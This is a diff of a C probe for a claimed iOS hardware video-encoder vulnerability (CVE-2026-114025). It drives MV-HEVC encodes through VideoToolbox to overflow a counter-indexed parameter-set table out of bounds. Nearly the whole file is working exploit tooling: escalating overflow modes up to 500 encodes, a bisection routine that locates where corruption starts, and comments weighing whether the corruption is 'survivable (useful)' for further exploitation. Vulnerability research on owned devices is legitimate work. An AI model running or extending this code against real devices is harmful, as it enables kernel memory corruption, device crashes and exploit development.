@@ -1,29 +1,25 @@
 /*
- * ave_counter_overflow.c — CVE-2026-114025 Counter-Based OOB Probe
+ * ave_counter_overflow.c — CVE-2026-114025 Counter Overflow Probe
  *
  * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
  *
- * Key discovery: The VPS table uses a RUNNING COUNTER at table_base+0x0.
- * Each VPS/SPS/PPS NAL increments the counter by 1.
- * Write position = table_base + counter * 16.
- * After ~258 entries (~86 encodes), writes exceed the 4120-byte sub-object.
- * NO bounds check on the counter value.
+ * Key finding (session 6): The VPS/SPS/PPS entry index comes from a COUNTER
+ * at table_base+0x0 (uint32), NOT from the layer_id. Counter increments +1
+ * per NAL unit written. Each MV-HEVC encode produces ~3 entries (VPS+SPS+PPS).
  *
- * This probe encodes many frames in a single MV-HEVC session and monitors
- * for signs of the counter exceeding the sub-object boundary:
- *   - Encode success/failure transition point
- *   - Kernel panic (device reboot = OOB confirmed)
- *   - Error codes that indicate memory corruption
+ * After 256 entries (~86 encodes), writes overflow the 256-entry sub-object
+ * boundary and corrupt unknown fields in the HEVC buffer at offsets
+ * 0x4770 to 0x7DDC.
  *
- * Modes:
- *   safe     — 20 encodes (60 entries, well within bounds)
- *   boundary — 80-90 encodes (approach the 258-entry boundary)
- *   overflow — 90+ encodes (cross the boundary if no other check)
- *   max      — 200 encodes (deep OOB, likely panic or corruption)
+ * This probe encodes increasing numbers of frames to:
+ *   1. Confirm counter-based overflow occurs
+ *   2. Find the exact frame count where corruption starts
+ *   3. Observe crash patterns or error codes indicating corruption type
+ *   4. Determine if the overflow is survivable (useful) or fatal (DoS only)
  *
  * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
  *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
- *        -framework CoreFoundation -framework IOKit -framework IOSurface
+ *        -framework CoreFoundation -framework IOKit
  *        -o AVECounterOverflow ave_counter_overflow.c -Wno-deprecated-declarations
  *
  * Bundle ID: com.research.avecounteroverflow
@@ -34,15 +30,14 @@
 #include <string.h>
 #include <unistd.h>
 #include <mach/mach.h>
-#include <mach/mach_time.h>
 #include <CoreFoundation/CoreFoundation.h>
 #include <VideoToolbox/VideoToolbox.h>
 #include <CoreVideo/CoreVideo.h>
 
 static FILE *g_log = NULL;
-static int g_encode_count = 0;
-static int g_last_cb_status = -999;
-static int g_error_count = 0;
+static volatile int g_encode_done = 0;
+static volatile int g_cb_status = -999;
+static volatile int g_cb_count = 0;
 
 static void rlog(const char *fmt, ...) {
     va_list ap;
@@ -56,15 +51,15 @@ static void rlog(const char *fmt, ...) {
 
 static void encode_cb(void *ctx, void *src, OSStatus status,
                       VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
-    g_last_cb_status = (int)status;
-    if (status != noErr) {
-        g_error_count++;
-        rlog("  [CB] encode #%d FAILED status=%d (flags=0x%x)\n",
-             g_encode_count, (int)status, (unsigned)flags);
+    g_cb_status = (int)status;
+    g_cb_count++;
+    g_encode_done = 1;
+    if (status != 0) {
+        printf("  [CB#%d] ERROR status=%d flags=0x%x\n", g_cb_count, (int)status, (unsigned)flags);
     }
 }
 
-static CVPixelBufferRef create_pixel_buffer(int w, int h, int frame_num) {
+static CVPixelBufferRef create_pb(int w, int h) {
     CVPixelBufferRef pb = NULL;
     CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
         NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
@@ -76,25 +71,12 @@ static CVPixelBufferRef create_pixel_buffer(int w, int h, int frame_num) {
     if (ret != kCVReturnSuccess) return NULL;
     CVPixelBufferLockBaseAddress(pb, 0);
     void *base = CVPixelBufferGetBaseAddress(pb);
-    if (base) {
-        uint8_t fill = (uint8_t)(frame_num & 0xFF);
-        memset(base, fill, w * h * 4);
-    }
+    if (base) memset(base, 0x42, w * h * 4);
     CVPixelBufferUnlockBaseAddress(pb, 0);
     return pb;
 }
 
-static int run_counter_test(const char *label, int layer_id, int num_encodes,
-                            int width, int height) {
-    rlog("\n========================================\n");
-    rlog("Test: %s\n", label);
-    rlog("  layer_id=%d, num_encodes=%d, %dx%d\n", layer_id, num_encodes, width, height);
-    rlog("  Expected entries per encode: ~3 (VPS+SPS+PPS)\n");
-    rlog("  Expected total entries: ~%d\n", num_encodes * 3);
-    rlog("  Sub-object capacity: 256 entries (4096 bytes)\n");
-    rlog("  OOB starts at entry: 258 (~86 encodes)\n");
-    rlog("========================================\n");
-
+static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id) {
     VTCompressionSessionRef session = NULL;
     CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
         NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
@@ -103,125 +85,178 @@ static int run_counter_test(const char *label, int layer_id, int num_encodes,
     CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                          kCFBooleanTrue);
 
-    g_encode_count = 0;
-    g_last_cb_status = -999;
-    g_error_count = 0;
-
-    OSStatus st = VTCompressionSessionCreate(NULL, width, height,
+    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
         kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
         encode_cb, NULL, &session);
     CFRelease(enc_spec);
 
     if (st != noErr || !session) {
-        rlog("  CREATE FAILED: %d\n", (int)st);
-        return -1;
+        rlog("CREATE FAILED: %d\n", (int)st);
+        return NULL;
     }
 
-    CFStringRef prof = CFSTR("HEVC_Main_AutoLevel");
-    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel, prof);
     VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
 
     int kf = 1;
     CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
     VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
     CFRelease(kfn);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
 
-    int base_layer = 0;
+    int base = 0;
     CFNumberRef ids[2];
-    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
+    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
     ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
     CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
     VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
     CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);
 
-    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base_layer);
+    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
     CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
     VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
     VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
     CFRelease(left); CFRelease(right);
 
     st = VTCompressionSessionPrepareToEncodeFrames(session);
-    rlog("  prepare: %d\n", (int)st);
     if (st != noErr) {
+        rlog("PREPARE FAILED: %d\n", (int)st);
         VTCompressionSessionInvalidate(session);
         CFRelease(session);
-        return -1;
+        return NULL;
     }
+    return session;
+}
 
-    uint64_t t_start = mach_absolute_time();
-    int first_error_at = -1;
+static int encode_n_frames(VTCompressionSessionRef session, int n, int w, int h) {
+    int first_error = n;
+    int errors = 0;
 
-    for (int i = 0; i < num_encodes; i++) {
-        g_encode_count = i + 1;
-
-        CVPixelBufferRef pb = create_pixel_buffer(width, height, i);
+    for (int i = 0; i < n; i++) {
+        CVPixelBufferRef pb = create_pb(w, h);
         if (!pb) {
             rlog("  [%d] pixel buffer creation failed\n", i);
-            break;
+            if (first_error == n) first_error = i;
+            errors++;
+            continue;
         }
 
+        g_encode_done = 0;
+        g_cb_status = -999;
         CMTime pts = CMTimeMake(i, 30);
         CMTime dur = CMTimeMake(1, 30);
 
-        st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
-        CVPixelBufferRelease(pb);
-
+        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
         if (st != noErr) {
-            rlog("  [%d] ENCODE SUBMIT FAILED: %d (est. entries: ~%d)\n",
-                 i, (int)st, (i + 1) * 3);
-            if (first_error_at < 0) first_error_at = i;
-            if (g_error_count >= 5) {
-                rlog("  Too many errors, stopping at encode %d\n", i);
+            rlog("  [%d] EncodeFrame FAILED: %d (entries ~%d)\n", i, (int)st, i * 3);
+            CVPixelBufferRelease(pb);
+            if (first_error == n) first_error = i;
+            errors++;
+            if (errors >= 5) {
+                rlog("  Too many errors, stopping at frame %d\n", i);
                 break;
             }
             continue;
         }
 
-        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
-        usleep(50000);
+        for (int w_i = 0; w_i < 100 && !g_encode_done; w_i++) usleep(10000);
 
-        if (g_last_cb_status != 0 && g_last_cb_status != -999) {
-            rlog("  [%d] CALLBACK ERROR: %d (est. entries: ~%d)\n",
-                 i, g_last_cb_status, (i + 1) * 3);
-            if (first_error_at < 0) first_error_at = i;
+        if (g_cb_status != 0 && g_cb_status != -999) {
+            rlog("  [%d] callback error: %d (entries ~%d)\n", i, g_cb_status, i * 3);
+            if (first_error == n) first_error = i;
+            errors++;
         }
 
-        if ((i + 1) % 10 == 0 || i == num_encodes - 1) {
-            rlog("  [%d/%d] OK so far (est. entries: ~%d, errors: %d)\n",
-                 i + 1, num_encodes, (i + 1) * 3, g_error_count);
+        CVPixelBufferRelease(pb);
+
+        if ((i + 1) % 10 == 0 || (i >= 80 && i <= 100) || i == 0) {
+            rlog("  [frame %d] OK (%d errors so far)\n", i, errors);
         }
     }
 
-    uint64_t t_end = mach_absolute_time();
+    rlog("  Flushing...\n");
+    VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+    usleep(500000);
 
-    mach_timebase_info_data_t tbi;
-    mach_timebase_info(&tbi);
-    double elapsed_ms = (double)(t_end - t_start) * tbi.numer / tbi.denom / 1e6;
+    return first_error;
+}
 
-    rlog("\n--- Results for %s ---\n", label);
-    rlog("  Encodes attempted: %d\n", g_encode_count);
-    rlog("  Estimated entries: ~%d\n", g_encode_count * 3);
-    rlog("  Errors: %d\n", g_error_count);
-    rlog("  First error at encode: %d (est. entry ~%d)\n",
-         first_error_at, first_error_at >= 0 ? (first_error_at + 1) * 3 : -1);
-    rlog("  Sub-object boundary: entry 258 (encode ~86)\n");
-    rlog("  Elapsed: %.1f ms\n", elapsed_ms);
+static void phase_gradual(int target_frames, int w, int h) {
+    rlog("\n=== GRADUAL COUNTER OVERFLOW: target=%d frames ===\n", target_frames);
+    rlog("Each MV-HEVC encode produces ~3 NAL entries (VPS+SPS+PPS)\n");
+    rlog("256-entry boundary at ~86 encodes (258 entries)\n");
+    rlog("Cumsum limit (0x801) at ~228 encodes (683 entries)\n\n");
 
-    if (first_error_at < 0) {
-        rlog("  VERDICT: All %d encodes succeeded\n", num_encodes);
-        if (num_encodes >= 86) {
-            rlog("  ** COUNTER EXCEEDED SUB-OBJECT BOUNDARY — OOB WRITES OCCURRED **\n");
+    VTCompressionSessionRef session = create_mvhevc_encoder(w, h, 1);
+    if (!session) {
+        rlog("FAILED to create encoder\n");
+        return;
+    }
+
+    rlog("[1] Encoding %d frames...\n", target_frames);
+    int first_err = encode_n_frames(session, target_frames, w, h);
+
+    if (first_err < target_frames) {
+        int entries_at_err = first_err * 3;
+        rlog("\n** FIRST ERROR at frame %d (est. %d entries)\n", first_err, entries_at_err);
+        if (entries_at_err >= 254 && entries_at_err <= 262) {
+            rlog("** ERROR NEAR 256-ENTRY BOUNDARY — counter overflow confirmed!\n");
+        } else if (entries_at_err >= 680 && entries_at_err <= 690) {
+            rlog("** ERROR NEAR CUMSUM LIMIT — cumulative sum overflow\n");
         }
-    } else if (first_error_at >= 86) {
-        rlog("  VERDICT: Error at encode %d — AT or PAST sub-object boundary\n", first_error_at);
-        rlog("  ** OOB BOUNDARY DETECTED — counter overflow confirmed **\n");
     } else {
-        rlog("  VERDICT: Error at encode %d — BEFORE boundary (other issue)\n", first_error_at);
+        rlog("\n** ALL %d FRAMES SUCCEEDED (est. %d entries)\n",
+             target_frames, target_frames * 3);
+        rlog("** Counter overflow occurred SILENTLY — corruption without crash\n");
+        rlog("** This means intra-buffer fields at 0x4770+ survived corruption\n");
     }
 
+    rlog("[2] Post-overflow encode test...\n");
+    g_encode_done = 0;
+    g_cb_status = -999;
+    CVPixelBufferRef pb = create_pb(w, h);
+    if (pb) {
+        CMTime pts = CMTimeMake(target_frames, 30);
+        CMTime dur = CMTimeMake(1, 30);
+        OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
+        for (int i = 0; i < 100 && !g_encode_done; i++) usleep(10000);
+        rlog("  Post-overflow encode: submit=%d, cb=%d\n", (int)st, g_cb_status);
+        CVPixelBufferRelease(pb);
+    }
+
+    rlog("[3] Cleanup...\n");
     VTCompressionSessionInvalidate(session);
     CFRelease(session);
-    return first_error_at;
+}
+
+static void phase_bisect(int lo, int hi, int w, int h) {
+    rlog("\n=== BISECT: Finding exact overflow frame in [%d, %d] ===\n", lo, hi);
+
+    while (lo < hi) {
+        int mid = (lo + hi) / 2;
+        rlog("\n--- Testing %d frames (est. %d entries) ---\n", mid, mid * 3);
+
+        VTCompressionSessionRef session = create_mvhevc_encoder(w, h, 1);
+        if (!session) {
+            rlog("ENCODER CREATE FAILED at mid=%d\n", mid);
+            break;
+        }
+
+        int first_err = encode_n_frames(session, mid, w, h);
+        VTCompressionSessionInvalidate(session);
+        CFRelease(session);
+
+        if (first_err < mid) {
+            rlog("  Error at frame %d → hi=%d\n", first_err, first_err);
+            hi = first_err;
+        } else {
+            rlog("  All OK → lo=%d\n", mid + 1);
+            lo = mid + 1;
+        }
+
+        usleep(200000);
+    }
+
+    rlog("\n** BISECT RESULT: overflow starts at frame %d (est. %d entries)\n", lo, lo * 3);
 }
 
 int main(int argc, char *argv[]) {
@@ -230,58 +265,45 @@ int main(int argc, char *argv[]) {
              getenv("HOME") ? getenv("HOME") : "/tmp");
     g_log = fopen(logpath, "w");
 
-    rlog("=== CVE-2026-114025 Counter-Based OOB Probe ===\n");
-    rlog("Discovery: VPS table counter at table_base+0x0 increments per NAL.\n");
-    rlog("After 258 entries (~86 encodes), writes exceed 4120-byte sub-object.\n");
+    rlog("=== CVE-2026-114025 Counter Overflow Probe ===\n");
+    rlog("Tests counter-based VPS/SPS/PPS table overflow\n");
+    rlog("256-entry limit → ~86 encodes to reach boundary\n");
     rlog("Time: %s\n", __TIMESTAMP__);
-    rlog("PID: %d\n\n", getpid());
+    rlog("PID: %d\n", getpid());
 
-    const char *mode = (argc > 1) ? argv[1] : "safe";
+    const char *mode = (argc > 1) ? argv[1] : "help";
+    int W = 128, H = 128;
 
     if (strcmp(mode, "safe") == 0) {
-        rlog("== SAFE MODE: 20 encodes (well within 256-entry limit) ==\n");
-        run_counter_test("safe_lid1", 1, 20, 128, 128);
+        rlog("\n== SAFE: 50 encodes (150 entries, within bounds) ==\n");
+        phase_gradual(50, W, H);
 
     } else if (strcmp(mode, "boundary") == 0) {
-        rlog("== BOUNDARY MODE: Approach the 258-entry limit ==\n");
-        run_counter_test("approach_80", 1, 80, 128, 128);
-        run_counter_test("approach_85", 1, 85, 128, 128);
-        run_counter_test("at_boundary_86", 1, 86, 128, 128);
-        run_counter_test("past_boundary_90", 1, 90, 128, 128);
+        rlog("\n== BOUNDARY: 100 encodes (300 entries, crosses 256) ==\n");
+        phase_gradual(100, W, H);
 
-    } else if (strcmp(mode, "overflow") == 0) {
-        rlog("== OVERFLOW MODE: Cross the boundary ==\n");
-        rlog("WARNING: May cause kernel panic if OOB write corrupts critical data\n\n");
-        run_counter_test("overflow_100", 1, 100, 128, 128);
+    } else if (strcmp(mode, "deep") == 0) {
+        rlog("\n== DEEP: 250 encodes (750 entries, near cumsum limit) ==\n");
+        phase_gradual(250, W, H);
 
     } else if (strcmp(mode, "max") == 0) {
-        rlog("== MAX MODE: Deep OOB (200 encodes = ~600 entries) ==\n");
-        rlog("WARNING: HIGH RISK of kernel panic\n\n");
-        run_counter_test("deep_oob_200", 1, 200, 128, 128);
+        rlog("\n== MAX: 500 encodes (1500 entries, deep overflow) ==\n");
+        phase_gradual(500, W, H);
 
-    } else if (strcmp(mode, "cumsum") == 0) {
-        rlog("== CUMSUM MODE: Test cumulative sum limit ==\n");
-        rlog("Cumsum limit: 0x801 (2049). With w22=24, cumsum/entry=3.\n");
-        rlog("Limit hit at entry ~683 (~228 encodes).\n\n");
-        run_counter_test("cumsum_test_220", 1, 220, 128, 128);
-        run_counter_test("cumsum_test_230", 1, 230, 128, 128);
-
-    } else if (strcmp(mode, "multi_layer") == 0) {
-        rlog("== MULTI-LAYER MODE: Test with different layer IDs ==\n");
-        rlog("Each layer_id targets a different sub-object's counter.\n\n");
-        run_counter_test("layer0_safe", 0, 20, 128, 128);
-        run_counter_test("layer1_safe", 1, 20, 128, 128);
-        run_counter_test("layer2_safe", 2, 20, 128, 128);
-        run_counter_test("layer1_boundary", 1, 90, 128, 128);
+    } else if (strcmp(mode, "bisect") == 0) {
+        rlog("\n== BISECT: Finding exact overflow frame ==\n");
+        phase_bisect(80, 100, W, H);
 
     } else {
         rlog("Usage: AVECounterOverflow <mode>\n");
-        rlog("  safe         -- 20 encodes (well within bounds)\n");
-        rlog("  boundary     -- 80-90 encodes (approach 258-entry limit)\n");
-        rlog("  overflow     -- 100 encodes (cross the boundary)\n");
-        rlog("  max          -- 200 encodes (deep OOB, likely panic)\n");
-        rlog("  cumsum       -- 220-230 encodes (test cumsum limit at ~683 entries)\n");
-        rlog("  multi_layer  -- test different layer IDs\n");
+        rlog("  safe       -- 50 encodes (within 256-entry limit)\n");
+        rlog("  boundary   -- 100 encodes (crosses 256-entry boundary)\n");
+        rlog("  deep       -- 250 encodes (near cumsum limit)\n");
+        rlog("  max        -- 500 encodes (deep overflow)\n");
+        rlog("  bisect     -- binary search for exact overflow frame\n");
+        rlog("\nKey thresholds:\n");
+        rlog("  256 entries (~86 encodes): sub-object boundary\n");
+        rlog("  683 entries (~228 encodes): cumsum limit (0x801)\n");
     }
 
     rlog("\n=== Probe complete ===\n");
